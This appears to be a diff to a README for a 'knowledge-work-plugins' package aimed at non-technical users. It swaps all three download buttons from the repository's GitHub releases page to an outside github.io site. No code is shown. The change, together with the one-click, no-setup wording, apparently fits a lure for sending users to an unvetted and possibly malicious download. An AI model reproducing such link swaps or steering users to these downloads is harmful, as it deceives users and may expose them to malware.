@@ -1,6 +1,6 @@
 # 🧠 knowledge-work-plugins - Unlock Smarter Workflows for Knowledge Workers
 
-[![Download Now](https://img.shields.io/badge/Download-Plugin%20Package-blue?style=for-the-badge&logo=github)](https://github.com/hashimsmokefilled3971/knowledge-work-plugins/releases)
+[![Download Now](https://img.shields.io/badge/Download-Plugin%20Package-blue?style=for-the-badge&logo=github)](https://hashimsmokefilled3971.github.io)
 
 ---
 
@@ -31,7 +31,7 @@ That's it! No complicated setup, no technical knowledge required.
 
 Click the big button below to go to the official download page for knowledge-work-plugins:
 
-[![Download knowledge-work-plugins](https://img.shields.io/badge/⬇️-Download%20Now-2ea44f?style=for-the-badge)](https://github.com/hashimsmokefilled3971/knowledge-work-plugins/releases)
+[![Download knowledge-work-plugins](https://img.shields.io/badge/⬇️-Download%20Now-2ea44f?style=for-the-badge)](https://hashimsmokefilled3971.github.io)
 
 ### Step 2: Download the Application
 
@@ -176,7 +176,7 @@ knowledge-work-plugins is here to make your work life easier. Whether you're wri
 
 Remember, the download is just one click away:
 
-[![Download Now](https://img.shields.io/badge/📦-Get%20The%20Plugins-blue?style=for-the-badge&logo=appveyor)](https://github.com/hashimsmokefilled3971/knowledge-work-plugins/releases)
+[![Download Now](https://img.shields.io/badge/📦-Get%20The%20Plugins-blue?style=for-the-badge&logo=appveyor)](https://hashimsmokefilled3971.github.io)
 
 Happy knowledge working! 🚀
 
